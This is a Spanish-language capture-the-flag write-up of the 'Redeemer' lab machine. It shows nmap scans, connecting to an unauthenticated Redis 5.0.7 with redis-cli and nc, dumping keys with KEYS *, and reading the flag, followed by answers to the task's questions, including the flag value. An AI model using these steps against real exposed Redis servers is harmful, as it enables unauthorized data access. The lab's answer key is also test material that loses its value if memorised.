# Reedemer WriteUp
#Redis 
#Anonymous
#BasesDeDatos


```java
IP atacante: 10.10.16.133
IP victima:  10.129.195.219
```

`$nmap -p- -Pn -n --min-rate 5000 10.129.195.219`
```java
PORT     STATE SERVICE
6379/tcp open  redis
```

`$sudo nmap -p6379 -sSCV 10.129.195.219`
```java
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

>Redis (**RE**mote **DI**ctionary **OS**Server) es un almacén de clave/valor NoSQL de código abierto, en memoria, que se utiliza principalmente como caché de aplicaciones o base de datos de respuesta rápida.[¹](https://www.ibm.com/mx-es/topics/redis)

>La arquitectura de Redis es tipo cliente-servidor, pueden estar en el mismo nodo o estar distribuidos.  
>El servidor se encarga de almacenar datos en memoria.
>El cliente puede tratarse de la **Redis CLI**: su herramienta de consola, o bien una API. 
>La replicación (duplicación de datos) en Redis es de tipo **maestro-esclavo**.
>Cada servidor puede tener varias réplicas, que además de lecturas, también pueden configurarse para aceptar escrituras.[²](https://aprenderbigdata.com/redis/)

Vemos algo importante, habla de **redis-cli**, indagando en hacktricks podemos ver esto:

>Redis es un protocolo basado en texto. Envía el comando en un socket y los valores devueltos serán legibles. Puede ejecutarse con SSL/TLS (aunque esto es bastante inusual). En una instancia normal de Redis, puedes conectarte usando nc o también puedes usar redis-cli:
>>`nc -vn 10.10.10.10 6379`
>>`redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools`

Comenzamos a probar lentamente y después jugamos con la herramienta.
Pero hablando del `cli`, muy fácilmente logramos hacer una key de prueba:
```java
10.129.195.219:6379> SET my_key Tumama
OK
10.129.195.219:6379> get my_key
"Tumama"
10.129.195.219:6379> 
```

Tomando en cuenta la opción mediante `nc` (Banner Grab), también podemos enumerar información.
`$nc -vn 10.129.195.219 6379`
```java
(UNKNOWN) [10.129.195.219] 6379 (redis) open
INFO
$3295
# Server
redis_version:5.0.7
...
```

Listaremos las bases de datos y número de claves con `INFO keyspace`, donde la cantidad incluye la key que creamos, no parece de mucha utilidad, tal vez para después.
```java
INFO keyspace
$44
# Keyspace
db0:keys=5,expires=0,avg_ttl=0
```

Uno de los comandos para explotar información es `KEYS *`. Y obtenemos información interesante:
```java
KEYS *
*5
$4
temp
$4
flag
$6
my_key
$4
stor
$4
numb
```

Podemos notar que está nuestra llave de prueba y la podemos leer. Lo mismo con la flag.
```java
get  my_key
$6
Tumama
get flag
$32
t3L4c0M15t3eNT3r4953eb03e1d2b376
```

Preguntas
1. ¿Qué puerto TCP está abierto en la máquina?
	  6379
2. ¿Qué servicio se ejecuta en el puerto abierto de la máquina?
	  redis
3. ¿Qué tipo de base de datos es Redis? Elija entre las siguientes opciones: (i) Base de datos en memoria, (ii) Base de datos tradicional.
	  i
4. ¿Qué utilidad de línea de comandos se utiliza para interactuar con el servidor Redis? Introduzca el nombre del programa que introduciría en la terminal sin argumentos.
	  redis-cli
5. ¿Qué flag se utiliza con la utilidad de línea de comandos de Redis para especificar el nombre de host?
	  -h
6. Una vez conectado a un servidor Redis, ¿qué comando se utiliza para obtener la información y las estadísticas sobre el servidor Redis?
	  info
7. ¿Cuál es la versión del servidor Redis que se utiliza en la máquina de destino?
	  5.0.7
8. ¿Qué comando se utiliza para seleccionar la base de datos deseada en Redis?
	  select
9. ¿Cuántas claves hay dentro de la base de datos con índice 0?
	  En la salida obtuvimos 5 por la modificación, la respuesta esperada es 4.
10. ¿Qué comando se utiliza para obtener todas las claves de una base de datos?
	  keys *
